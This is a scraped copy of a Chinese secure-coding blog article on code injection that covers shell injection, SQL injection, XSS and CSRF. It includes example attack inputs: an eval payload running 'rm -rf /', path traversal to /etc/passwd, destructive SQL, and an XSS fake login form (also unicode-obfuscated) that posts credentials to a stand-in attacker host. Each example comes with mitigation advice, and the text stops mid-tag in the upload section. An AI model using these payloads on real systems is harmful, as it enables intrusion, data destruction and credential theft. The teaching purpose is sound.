{
  "Source": "coolshell.cn",
  "Title": "程序员疫苗：代码注入",
  "Link": "https://coolshell.cn/articles/8711.html",
  "Content": "\u003cdiv class=\"entry-content\"\u003e\n\u003cp\u003e\u003cscript async=\"\" src=\"https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158\" crossorigin=\"anonymous\" type=\"fe6ec1d619ab5af4a9106cdb-text/javascript\"\u003e\u003c/script\u003e\u003cimg decoding=\"async\" class=\"alignright  wp-image-8730\" title=\"程序员疫苗\" src=\"https://coolshell.cn/wp-content/uploads/2012/12/200906020837401710.jpg\" alt=\"\" width=\"245\" height=\"206\" srcset=\"https://coolshell.cn/wp-content/uploads/2012/12/200906020837401710.jpg 350w, https://coolshell.cn/wp-content/uploads/2012/12/200906020837401710-300x252.jpg 300w, https://coolshell.cn/wp-content/uploads/2012/12/200906020837401710-321x270.jpg 321w\" sizes=\"(max-width: 245px) 100vw, 245px\"/\u003e几个月在\u003ca href=\"http://weibo.com/haeol\" target=\"_blank\"\u003e我的微博\u003c/a\u003e上说过要建一个程序员疫苗网站，希望大家一起来提交一些错误示例的代码，来帮助我们新入行的程序员，不要让我们的程序员一代又一代的再重复地犯一些错误。很多程序上错误就像人类世界的病毒一样，我们应该给我们的新入行的程序员注射一些疫苗，就像给新生儿打疫苗一样，希望程序员从入行时就对这些错误有抵抗力。\u003c/p\u003e\n\u003cp\u003e我的那个疫苗网站正在建议中（不好意思拖了很久），不过，我可以先写一些关于程序员疫苗性质的文章，也算是热热身。希望大家喜欢，先向大家介绍第一注疫苗——代码注入。\u003c/p\u003e\n\u003cdiv id=\"ez-toc-container\" class=\"ez-toc-v2_0_48 counter-hierarchy ez-toc-counter ez-toc-grey ez-toc-container-direction\"\u003e\n\u003cdiv class=\"ez-toc-title-container\"\u003e\n\u003cp class=\"ez-toc-title\"\u003e目录\u003c/p\u003e\n\u003cspan class=\"ez-toc-title-toggle\"\u003e\u003c/span\u003e\u003c/div\u003e\n\u003cnav\u003e\u003cul class=\"ez-toc-list ez-toc-list-level-1 \"\u003e\u003cli class=\"ez-toc-page-1 ez-toc-heading-level-4\"\u003e\u003ca class=\"ez-toc-link ez-toc-heading-1\" href=\"#Shell%E6%B3%A8%E5%85%A5\" title=\"Shell注入\"\u003eShell注入\u003c/a\u003e\u003c/li\u003e\u003cli class=\"ez-toc-page-1 ez-toc-heading-level-4\"\u003e\u003ca class=\"ez-toc-link ez-toc-heading-2\" href=\"#SQL%E6%B3%A8%E5%85%A5\" title=\"SQL注入\"\u003eSQL注入\u003c/a\u003e\u003c/li\u003e\u003cli class=\"ez-toc-page-1 ez-toc-heading-level-4\"\u003e\u003ca class=\"ez-toc-link ez-toc-heading-3\" href=\"#%E8%B7%A8%E7%BD%91%E7%AB%99%E8%84%9A%E6%9C%AC%E6%B3%A8_%E5%85%A5\" title=\"跨网站脚本注 入\"\u003e跨网站脚本注 入\u003c/a\u003e\u003c/li\u003e\u003cli class=\"ez-toc-page-1 ez-toc-heading-level-4\"\u003e\u003ca class=\"ez-toc-link ez-toc-heading-4\" href=\"#%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6\" title=\"上传文件\"\u003e上传文件\u003c/a\u003e\u003c/li\u003e\u003cli class=\"ez-toc-page-1 ez-toc-heading-level-4\"\u003e\u003ca class=\"ez-toc-link ez-toc-heading-5\" href=\"#URL%E8%B7%B3%E8%BD%AC\" title=\"URL跳转\"\u003eURL跳转\u003c/a\u003e\u003c/li\u003e\u003c/ul\u003e\u003c/nav\u003e\u003c/div\u003e\n\u003ch4\u003e\u003cspan class=\"ez-toc-section\" id=\"Shell%E6%B3%A8%E5%85%A5\"\u003e\u003c/span\u003eShell注入\u003cspan class=\"ez-toc-section-end\"\u003e\u003c/span\u003e\u003c/h4\u003e\n\u003cp\u003e我们先来看一段perl的代码：\u003c/p\u003e\n\u003cp\u003e[perl]use CGI qw(:standard);\u003cbr/\u003e\n$name = param(‘name’);\u003cbr/\u003e\n$nslookup = \u0026#34;/path/to/nslookup\u0026#34;;\u003cbr/\u003e\nprint header;\u003cbr/\u003e\nif (open($fh, \u0026#34;$nslookup $name|\u0026#34;)) {\u003cbr/\u003e\n  while (\u0026lt;$fh\u0026gt;) {\u003cbr/\u003e\nprint escapeHTML($_);\u003cbr/\u003e\nprint \u0026#34;\u0026lt;br\u0026gt;\\n\u0026#34;;\u003cbr/\u003e\n}\u003cbr/\u003e\nclose($fh);\u003cbr/\u003e\n}[/perl]\u003c/p\u003e\n\u003cp\u003e如果用户输入的参数是：\u003c/p\u003e\n\u003cp\u003e\u003ccode data-enlighter-language=\"shell\" class=\"EnlighterJSRAW\"\u003ecoolshell.cn%20%3B%20/bin/ls%20-l\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e那么，这段perl的程序就成了：\u003c/p\u003e\n\u003cp\u003e\u003cspan id=\"more-8711\"\u003e\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode data-enlighter-language=\"shell\" class=\"EnlighterJSRAW\"\u003e/path/to/nslookup coolshell.cn ; /bin/ls -l\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e我们再来看一段PHP的程序：\u003c/p\u003e\n\u003cpre data-enlighter-language=\"php\" class=\"EnlighterJSRAW\"\u003e$myvar = \u0026#39;somevalue\u0026#39;;\n$x = $_GET[\u0026#39;arg\u0026#39;];\neval(\u0026#39;$myvar = \u0026#39; . $x . \u0026#39;;\u0026#39;);\u003c/pre\u003e\n\u003cp\u003e“\u003ccode\u003eeval\u003c/code\u003e“的参数将会视同PHP处理，所以额外的命令可被添加。例如：如果”arg”如果被设成”\u003ccode\u003e10; system(\u0026#39;rm -rf /\u0026#39;)\u003c/code\u003e“，后面的”\u003ccode\u003esystem(\u0026#39;rm -rf /\u0026#39;)\u003c/code\u003e“代码将被运行，这等同在服务器上运行开发者意料外的程序。（关于rm -rf /，你懂的，可参看“\u003ca title=\"一个空格引发的惨剧\" href=\"https://coolshell.cn/articles/4875.html\" target=\"_blank\"\u003e一个空格引发的悲剧\u003c/a\u003e”）\u003c/p\u003e\n\u003cp\u003e再来看一个PHP的代码\u003c/p\u003e\n\u003cpre data-enlighter-language=\"php\" class=\"EnlighterJSRAW\"\u003e$isadmin= false;\n...\n...\nforeach ($_GET as $key =\u0026gt; $value) {\n  $$key = $value;\n}\u003c/pre\u003e\n\u003cp\u003e如果攻击者在查询字符串中给定”isadmin=1″，那$isadmin将会被设为值 “1”，然后攻击值就取得了网站应用的admin权限了。\u003c/p\u003e\n\u003cp\u003e再来看一个PHP的示例：\u003c/p\u003e\n\u003cpre data-enlighter-language=\"php\" class=\"EnlighterJSRAW\"\u003e$action = \u0026#39;login\u0026#39;;\n   if (__isset( $_GET[\u0026#39;act\u0026#39;] ) )\n      $action = $_GET[\u0026#39;act\u0026#39;];\n   require( $action . \u0026#39;.php\u0026#39; ); \u003c/pre\u003e\n\u003cp\u003e这个代码相当危险，攻击者有可能可以干这些事：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e/test.php?act=\u003cstrong\u003ehttp://evil/exploit\u003c/strong\u003e\u003c/code\u003e – 注入远程机器上有漏洞的文件。\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e/test.php?act=\u003cstrong\u003e/home/www/bbs/upload/exploit\u003c/strong\u003e\u003c/code\u003e – 从一个已经上载、叫做exploit.php文件运行其代码。\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e/test.php?act=\u003cstrong\u003e../../../../etc/passwd%00\u003c/strong\u003e\u003c/code\u003e – 让攻击者取得该UNIX系统目录检索下密码文件的内容。一个使用空元字符以解除\u003ccode\u003e.php\u003c/code\u003e扩展名限制，允许访问其他非 .php 结尾文件。 (PHP默认值”magic_quotes_gpc = On”可以终止这种攻击)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e这样的示例有很多，只要你的程序有诸如：\u003ccode\u003esystem()\u003c/code\u003e、\u003ccode\u003eStartProcess()\u003c/code\u003e、\u003ccode\u003ejava.lang.Runtime.exec()\u003c/code\u003e、\u003ccode\u003eSystem.Diagnostics.Process.Start()\u003c/code\u003e以及类似的应用程序接口，都是比较危险的，最好不要让其中的字符串去拼装用户的输入。\u003c/p\u003e\n\u003cp\u003ePHP提供\u003ccode\u003e\u003ca href=\"http://www.php.net/manual/en/function.escapeshellarg.php\" rel=\"nofollow\"\u003eescapeshellarg()\u003c/a\u003e\u003c/code\u003e和\u003ccode\u003e\u003ca href=\"http://www.php.net/manual/en/function.escapeshellcmd.php\" rel=\"nofollow\"\u003eescapeshellcmd()\u003c/a\u003e\u003c/code\u003e以在调用方法以前进行编码。然而，实际上并不建议相信这些方法是安全的 。\u003c/p\u003e\n\u003ch4\u003e\u003cspan class=\"ez-toc-section\" id=\"SQL%E6%B3%A8%E5%85%A5\"\u003e\u003c/span\u003eSQL注入\u003cspan class=\"ez-toc-section-end\"\u003e\u003c/span\u003e\u003c/h4\u003e\n\u003cp\u003eSQL injection，是发生于应用程序之数据库层的安全漏洞。简而言之，是在输入的字符串之中注入SQL指令，在设计不良的程序当中忽略了检查，那么这些注入进去的指令就会被数据库服务器误认为是正常的SQL指令而运行，因此遭到破坏。\u003c/p\u003e\n\u003cp\u003e在应用程序中若有下列状况，则可能应用程序正暴露在SQL Injection的高风险情况下：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e在应用程序中使用字符串联结方式组合SQL指令（如：引号没有转义）。\u003c/li\u003e\n\u003cli\u003e在应用程序链接数据库时使用权限过大的帐户（如：很多开发人员都喜欢用sa（最高权限的系统管理员帐户）连接Microsoft SQL Server数据库）。\u003c/li\u003e\n\u003cli\u003e在数据库中开放了不必要但权力过大的功能（例如在Microsoft SQL Server数据库中的xp_cmdshell延伸预存程序或是OLE Automation预存程序等）\u003c/li\u003e\n\u003cli\u003e过于信任用户所输入的数据，未限制输入的字符数，以及未对用户输入的数据做潜在指令的检查。\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e例程：\u003c/p\u003e\n\u003cp\u003e某个网站的登录验证的SQL查询代码为\u003c/p\u003e\n\u003cdiv dir=\"ltr\"\u003e\n\u003cdiv\u003e\n\u003cpre data-enlighter-language=\"sql\" class=\"EnlighterJSRAW\"\u003estrSQL = \u0026#34;SELECT * FROM users\nWHERE (name = \u0026#39;\u0026#34; + userName + \u0026#34;\u0026#39;) and (pw = \u0026#39;\u0026#34;+ passWord +\u0026#34;\u0026#39;);\u0026#34;\u003c/pre\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003cp\u003e用户在登录时恶意输入如下的的用户名和口令：\u003c/p\u003e\n\u003cdiv dir=\"ltr\"\u003e\n\u003cdiv\u003e\u003ccode data-enlighter-language=\"sql\" class=\"EnlighterJSRAW\"\u003euserName = \u0026#34;\u0026#39; OR \u0026#39;1\u0026#39;=\u0026#39;1\u0026#34;;\u003c/code\u003e\u003cp\u003e\u003c/p\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003cdiv dir=\"ltr\"\u003e\n\u003cdiv\u003e\u003ccode data-enlighter-language=\"sql\" class=\"EnlighterJSRAW\"\u003epassWord = \u0026#34;\u0026#39; OR \u0026#39;1\u0026#39;=\u0026#39;1\u0026#34;;\u003c/code\u003e\u003cp\u003e\u003c/p\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003cp\u003e此时，将导致原本的SQL字符串被解析为：\u003c/p\u003e\n\u003cdiv dir=\"ltr\"\u003e\n\u003cdiv\u003e\n\u003cpre data-enlighter-language=\"sql\" class=\"EnlighterJSRAW\"\u003estrSQL = \u0026#34;SELECT * FROM users\nWHERE (name = \u0026#39;\u0026#39; OR \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;) and (pw = \u0026#39;\u0026#39; OR \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;);\u0026#34;\u003c/pre\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003cp\u003e也就是实际上运行的SQL命令会变成下面这样的，因此导致无帐号密码，也可登录网站。\u003c/p\u003e\n\u003cdiv dir=\"ltr\"\u003e\n\u003cdiv\u003e\u003ccode data-enlighter-language=\"sql\" class=\"EnlighterJSRAW\"\u003estrSQL = \u0026#34;SELECT * FROM users;\u0026#34;\u003c/code\u003e\u003cp\u003e\u003c/p\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003cp\u003e这还不算恶劣的，真正恶劣的是在你的语句后再加一个自己的语句，如：\u003c/p\u003e\n\u003cp\u003e\u003ccode data-enlighter-language=\"sql\" class=\"EnlighterJSRAW\"\u003eusername= \u0026#34;\u0026#39; ; DELETE FROM users; --\u0026#34;;\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e这样一来，要么整个数据库的表被人盗走，要么被数据库被删除。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e所以SQL注入攻击被俗称为黑客的填空游戏\u003c/strong\u003e。你是否还记得酷壳\u003ca title=\"千万别惹程序员\" href=\"https://coolshell.cn/articles/6639.html\" target=\"_blank\"\u003e这篇文章里的SQL注入\u003c/a\u003e？\u003c/p\u003e\n\u003cp\u003e\u003cimg decoding=\"async\" loading=\"lazy\" class=\"aligncenter\" title=\"SQL-injection-attack(adjusted)\" src=\"https://coolshell.cn//wp-content/uploads/2012/02/SQL-injection-attackadjusted.jpg\" alt=\"\" width=\"600\" height=\"407\"/\u003e\u003c/p\u003e\n\u003cp\u003e当他们发现一个网站有SQL注入的时候，他们一般会干下面的事：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e盗取数据表中的数据，例如个人机密数据（信用卡，身份证，手机号，通讯录……），帐户数据，密码等，获得用户的数据和信息后对这些用户进行“社会工程学”活动（如：\u003ca title=\"为什么不能用微信或米聊这类的软件\" href=\"https://coolshell.cn/articles/8638.html\" target=\"_blank\"\u003e我前两天在微信上亲身经历\u003c/a\u003e）。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cul\u003e\n\u003cli\u003e取得系统管理员权限（例如ALTER LOGIN sa WITH PASSWORD=’xxxxxx’）。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cul\u003e\n\u003cli\u003e在数据库中的数据中插入一些HTML/JS代码，有可能得以在网页加入恶意链接以及XSS，这样一来就让访问者被黑。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cul\u003e\n\u003cli\u003e经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统（例如：MS SQL Server的 xp_cmdshell “net stop iisadmin”可停止服务器的IIS服务）。甚至破坏硬盘数据，瘫痪全系统（例如xp_cmdshell “FORMAT C:”）。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv\u003e现在的黑客比较坏，瘫痪系统的事，他们干的越来越少，因为没什么利益，他们希望通过获取用户的帐号信息后，转而攻击用户别的帐号，如游戏帐号，网银帐号，QQ帐号等等他们可以获利的事情（这就是为什么我希望大家\u003ca title=\"如何管理并设计你的口令\" href=\"https://coolshell.cn/articles/2428.html\" target=\"_blank\"\u003e在不站点上使用不同的口令\u003c/a\u003e，甚至不同的用户信息的原因）\u003c/div\u003e\n\u003cp\u003e\u003cstrong\u003e如何避免\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e在组合SQL字符串时，先针对所传入的参数作字符转义（如：将单引号字符取代为连续2个单引号字符）。如果使用PHP开发网页程序的话，亦可打开PHP的Magic quote功能自动将所有的网页传入参数，将单引号字符取代为连续2个单引号字符。\u003cstrong\u003e如果可能应该过滤以下字符：分号“;”，两个减号“–”，单引号“’”，注释“/* … */”\u003c/strong\u003e。（当然，因为注入攻击一般用闭合的引号来玩，所以把引号转义了应该就没有什么问题了）\u003c/li\u003e\n\u003c/ul\u003e\n\u003cul\u003e\n\u003cli\u003e更换危险字符。例如在PHP通过\u003ccode\u003eaddslashes()\u003c/code\u003e函数保护SQL注入。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cul\u003e\n\u003cli\u003e限制用户输入的长度，限制用户输入的取值范围。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cul\u003e\n\u003cli\u003e为当前应用建立权限比较小的数据库用户，这样不会导致数据库管理员丢失。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cul\u003e\n\u003cli\u003e把数据库操作封装成一个Service，对于敏感数据，对于每个客户端的IP，在一定时间内每次只返回一条记录。这样可以避免被拖库。\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4\u003e\u003c/h4\u003e\n\u003ch4\u003e\u003cspan class=\"ez-toc-section\" id=\"%E8%B7%A8%E7%BD%91%E7%AB%99%E8%84%9A%E6%9C%AC%E6%B3%A8_%E5%85%A5\"\u003e\u003c/span\u003e跨网站脚本注 入\u003cspan class=\"ez-toc-section-end\"\u003e\u003c/span\u003e\u003c/h4\u003e\n\u003cp\u003e\u003cstrong\u003e跨网站脚本\u003c/strong\u003e（\u003cstrong\u003eCross-site\u003c/strong\u003e scripting，通常简称为XSS或跨站脚本或跨站脚本攻击）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java， VBScript， ActiveX， Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。\u003c/p\u003e\n\u003cp\u003e假如我们有这样一段PHP的代码：\u003c/p\u003e\n\u003cpre data-enlighter-language=\"php\" class=\"EnlighterJSRAW\"\u003e$username = $_GET[\u0026#39;username\u0026#39;];\necho \u0026#39;\u0026lt;div\u0026gt; Welcome, \u0026#39; . $username . \u0026#39;\u0026lt;/div\u0026gt;\u0026#39;;\u003c/pre\u003e\n\u003cp\u003e那么我们可以这样来注入：\u003c/p\u003e\n\u003cdiv style=\"color: #1b00aa; background-color: #efefef; border: 1px solid #DDE2F5; font-size: 90%; padding: 10px;\"\u003ehttp://trustedSite.example.com/welcome.php?username=\u0026lt;Script Language=”Javascript”\u0026gt;alert(“You’ve been attacked!”);\u0026lt;/Script\u0026gt;\u003c/div\u003e\n\u003cp\u003e甚至这样：\u003c/p\u003e\n\u003cdiv style=\"color: #1b00aa; background-color: #efefef; border: 1px solid #DDE2F5; font-size: 90%; padding: 10px;\"\u003ehttp://trustedSite.example.com/welcome.php?username=\u0026lt;div id=”stealPassword”\u0026gt;Please Login:\u0026lt;form name=”input” action=”http://attack.example.com/stealPassword.php” method=”post”\u0026gt;Username: \u0026lt;input type=”text” name=”username” /\u0026gt;\u0026lt;br/\u0026gt;Password: \u0026lt;input type=”password” name=”password” /\u0026gt;\u0026lt;input type=”submit” value=”Login” /\u0026gt;\u0026lt;/form\u0026gt;\u0026lt;/div\u0026gt;\u003c/div\u003e\n\u003cp\u003e这会让网页显示以下内容：\u003c/p\u003e\n\u003cpre data-enlighter-language=\"html\" class=\"EnlighterJSRAW\"\u003e\u0026lt;div class=\u0026#34;header\u0026#34;\u0026gt; Welcome,\n    \u0026lt;div id=\u0026#34;stealPassword\u0026#34;\u0026gt;Please Login:\n        \u0026lt;form name=\u0026#34;input\u0026#34; action=\u0026#34;attack.example.com/stealPassword.php\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt;\n            Username: \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;username\u0026#34; /\u0026gt;\n            \u0026lt;br/\u0026gt;\n            Password: \u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34; /\u0026gt;\n            \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Login\u0026#34; /\u0026gt;\n        \u0026lt;/form\u0026gt;\n    \u0026lt;/div\u0026gt;\n\u0026lt;/div\u0026gt;\n\u003c/pre\u003e\n\u003cp\u003e注入的代码还有可能变种为如下这种更为隐蔽的方式(unicode码)：\u003c/p\u003e\n\u003cdiv style=\"color: #1b00aa; background-color: #efefef; border: 1px solid #DDE2F5; font-size: 90%; padding: 10px;\"\u003e\n\u003cdiv\u003etrustedSite.example.com/welcome.php?username=\u0026lt;script+type=”text/javascript”\u0026gt;\u003c/div\u003e\n\u003cdiv\u003edocument.write(‘\\u003C\\u0064\\u0069\\u0076\\u0020\\u0069\\u0064\\u003D\\u0022\\u0073\u003c/div\u003e\n\u003cdiv\u003e\\u0074\\u0065\\u0061\\u006C\\u0050\\u0061\\u0073\\u0073\\u0077\\u006F\\u0072\\u0064\u003c/div\u003e\n\u003cdiv\u003e\\u0022\\u003E\\u0050\\u006C\\u0065\\u0061\\u0073\\u0065\\u0020\\u004C\\u006F\\u0067\u003c/div\u003e\n\u003cdiv\u003e\\u0069\\u006E\\u003A\\u003C\\u0066\\u006F\\u0072\\u006D\\u0020\\u006E\\u0061\\u006D\u003c/div\u003e\n\u003cdiv\u003e\\u0065\\u003D\\u0022\\u0069\\u006E\\u0070\\u0075\\u0074\\u0022\\u0020\\u0061\\u0063\u003c/div\u003e\n\u003cdiv\u003e\\u0074\\u0069\\u006F\\u006E\\u003D\\u0022\\u0068\\u0074\\u0074\\u0070\\u003A\\u002F\u003c/div\u003e\n\u003cdiv\u003e\\u002F\\u0061\\u0074\\u0074\\u0061\\u0063\\u006B\\u002E\\u0065\\u0078\\u0061\\u006D\u003c/div\u003e\n\u003cdiv\u003e\\u0070\\u006C\\u0065\\u002E\\u0063\\u006F\\u006D\\u002F\\u0073\\u0074\\u0065\\u0061\u003c/div\u003e\n\u003cdiv\u003e\\u006C\\u0050\\u0061\\u0073\\u0073\\u0077\\u006F\\u0072\\u0064\\u002E\\u0070\\u0068\u003c/div\u003e\n\u003cdiv\u003e\\u0070\\u0022\\u0020\\u006D\\u0065\\u0074\\u0068\\u006F\\u0064\\u003D\\u0022\\u0070\u003c/div\u003e\n\u003cdiv\u003e\\u006F\\u0073\\u0074\\u0022\\u003E\\u0055\\u0073\\u0065\\u0072\\u006E\\u0061\\u006D\u003c/div\u003e\n\u003cdiv\u003e\\u0065\\u003A\\u0020\\u003C\\u0069\\u006E\\u0070\\u0075\\u0074\\u0020\\u0074\\u0079\u003c/div\u003e\n\u003cdiv\u003e\\u0070\\u0065\\u003D\\u0022\\u0074\\u0065\\u0078\\u0074\\u0022\\u0020\\u006E\\u0061\u003c/div\u003e\n\u003cdiv\u003e\\u006D\\u0065\\u003D\\u0022\\u0075\\u0073\\u0065\\u0072\\u006E\\u0061\\u006D\\u0065\u003c/div\u003e\n\u003cdiv\u003e\\u0022\\u0020\\u002F\\u003E\\u003C\\u0062\\u0072\\u002F\\u003E\\u0050\\u0061\\u0073\u003c/div\u003e\n\u003cdiv\u003e\\u0073\\u0077\\u006F\\u0072\\u0064\\u003A\\u0020\\u003C\\u0069\\u006E\\u0070\\u0075\u003c/div\u003e\n\u003cdiv\u003e\\u0074\\u0020\\u0074\\u0079\\u0070\\u0065\\u003D\\u0022\\u0070\\u0061\\u0073\\u0073\u003c/div\u003e\n\u003cdiv\u003e\\u0077\\u006F\\u0072\\u0064\\u0022\\u0020\\u006E\\u0061\\u006D\\u0065\\u003D\\u0022\u003c/div\u003e\n\u003cdiv\u003e\\u0070\\u0061\\u0073\\u0073\\u0077\\u006F\\u0072\\u0064\\u0022\\u0020\\u002F\\u003E\u003c/div\u003e\n\u003cdiv\u003e\\u003C\\u0069\\u006E\\u0070\\u0075\\u0074\\u0020\\u0074\\u0079\\u0070\\u0065\\u003D\u003c/div\u003e\n\u003cdiv\u003e\\u0022\\u0073\\u0075\\u0062\\u006D\\u0069\\u0074\\u0022\\u0020\\u0076\\u0061\\u006C\u003c/div\u003e\n\u003cdiv\u003e\\u0075\\u0065\\u003D\\u0022\\u004C\\u006F\\u0067\\u0069\\u006E\\u0022\\u0020\\u002F\u003c/div\u003e\n\u003cdiv\u003e\\u003E\\u003C\\u002F\\u0066\\u006F\\u0072\\u006D\\u003E\\u003C\\u002F\\u0064\\u0069\\u0076\\u003E\\u000D’);\u0026lt;/script\u0026gt;\u003c/div\u003e\n\u003c/div\u003e\n\u003cp\u003e\u003cstrong\u003eXSS的攻击主要是通过一段JS程序得用用户已登录的cookie去模拟用户的操作（甚至偷用户的cookie）\u003c/strong\u003e。这个方式可以让用户在自己不知情的情况下操作了自己不期望的操作。如果是网站的管理员中招，还有可能导致后台管理权限被盗。关于其中的一些细节可以参看《\u003ca title=\"新浪微博的XSS攻击\" href=\"https://coolshell.cn/articles/4914.html\" target=\"_blank\"\u003e新浪微博的XSS攻击\u003c/a\u003e》一文。XSS攻击是程序员有一糊涂就很容易犯的错误，你还可以看看网上的《\u003ca href=\"http://www.cnblogs.com/kingthy/archive/2011/08/20/2147355.html\" target=\"_blank\"\u003e腾讯微博的XSS攻击\u003c/a\u003e》。\u003c/p\u003e\n\u003cp\u003eXSS攻击在论坛的用户签档里面（使用img标签）也发生过很多次，包括像一些使用bcode的网站，很有可能会被注入一些可以被浏览器用来执行的代码。包括CSS都有可能被注入javascript代码。\u003c/p\u003e\n\u003cp\u003e不要以为XSS攻击是我们的程序没有写好，有时候，我们会引用别人站点上的js文件，比如：放一个天气预报的小Widget的js，或是一个流量监控，或是一段广告的js文件。你不知道这些东西是不是有问题，如果有恶意的话，这就是你自己主动注入攻击代码了。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e另外，XSS攻击有一部分是和浏览器有关的。\u003c/strong\u003e比如，如下的一些例子，你可能从来都没有想过吧？（\u003cstrong\u003e更多的例子可以参看酷壳很早以前的这篇文章《\u003ca href=\"https://coolshell.cn/articles/2416.html\" target=\"_blank\"\u003e浏览器HTML安全列表\u003c/a\u003e》\u003c/strong\u003e）\u003c/p\u003e\n\u003cpre data-enlighter-language=\"html\" class=\"EnlighterJSRAW\"\u003e\u0026lt;table background=”javascript:alert(1)”\u0026gt;\n\n\u0026lt;meta charset=”mac-farsi”\u0026gt;¼script¾alert(1)¼/script¾\n\n\u0026lt;img src=”javascript:alert(1)”\u0026gt;\u003c/pre\u003e\n\u003cp\u003eXSS攻击通常会引发CSRF攻击。CSRF攻击主要是通过在A站上设置B站点上的链接，通过使用用户在B站点上的登录且还没有过期的cookie，从而使得用户的B站点被攻击。（这得益于现在的多Tab页的浏览器，大家都会同时打开并登录很多的网站，而这些不同网站的页面间的cookie又是共享的）\u003c/p\u003e\n\u003cp\u003e于是，如果我在A站点内的某个贴子内注入这么一段代码：\u003c/p\u003e\n\u003cp\u003e\u003ccode data-enlighter-language=\"html\" class=\"EnlighterJSRAW\"\u003e\u0026lt;img src=\u0026#34;http://bank.example.com/transfer?account=XXX\u0026amp;amount=1000000\u0026amp;for=haoel\u0026#34;\u0026gt;\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e很有可能你就在访问A站的这个贴子时，你的网银可能向我转了一些钱。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e如何避免\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e要防止XSS攻击，一般来说有下面几种手段：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e严格限制用户的输入。最好不要让用户输入带标签的内容。最好不要让用户使用一些所见即所得的HTML编辑器。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cul\u003e\n\u003cli\u003e严格过滤用户的输入。如：\n\u003cul\u003e\n\u003cli\u003ePHP的\u003ccode\u003ehtmlentities()或是htmlspecialchars()或是strip_tags()\u003c/code\u003e。\u003c/li\u003e\n\u003cli\u003ePython的\u003ccode\u003ecgi.escape()\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eASP的\u003ccode\u003eServer.HTMLEncode()\u003c/code\u003e。\u003c/li\u003e\n\u003cli\u003eNode.js的node-validator。\u003c/li\u003e\n\u003cli\u003eJava的\u003ca href=\"https://code.google.com/p/xssprotect/\" rel=\"nofollow\"\u003exssprotect\u003c/a\u003e。\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cul\u003e\n\u003cli\u003e在一些关键功能，完全不能信任cookie，必需要用户输入口令。如：修改口令，支付，修改电子邮件，查看用户的敏感信息等等。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cul\u003e\n\u003cli\u003e限制cookie的过期时间。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cul\u003e\n\u003cli\u003e对于CSRF攻击，一是需要检查http的reference header。二是不要使用GET方法来改变数据，三是对于要提交的表单，后台动态生成一个随机的token，这个token是攻击者很难伪造的。（对于token的生成，建议找一些成熟的lib库）\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e另外，你可能觉得网站在处理用户的表单提交就行了，其实不是，\u003cstrong\u003e想一想那些Web Mail，我可以通过别的服务器向被攻击用户发送有JS代码、图片、Flash的邮件到你的邮箱，你打开一看，你就中招了\u003c/strong\u003e。所以，WebMail一般都禁止显示图片和附件，这些都很危险，只有你完全了解来源的情况下才能打开。\u003cstrong\u003e电子邮件的SMTP协议太差了，基本上无法校验其它邮件服务器的可信度，我甚至可以自己建一个本机的邮件服务器，想用谁的邮件地址发信就用谁的邮件地址发信\u003c/strong\u003e。\u003cspan style=\"color: #cc0000;\"\u003e\u003cstrong\u003e所以，我再次真诚地告诉大家，请用gmail邮箱\u003c/strong\u003e\u003c/span\u003e。别再跟我说什么QQMail之类的好用了。\u003c/p\u003e\n\u003ch4\u003e\u003cspan class=\"ez-toc-section\" id=\"%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6\"\u003e\u003c/span\u003e上传文件\u003cspan 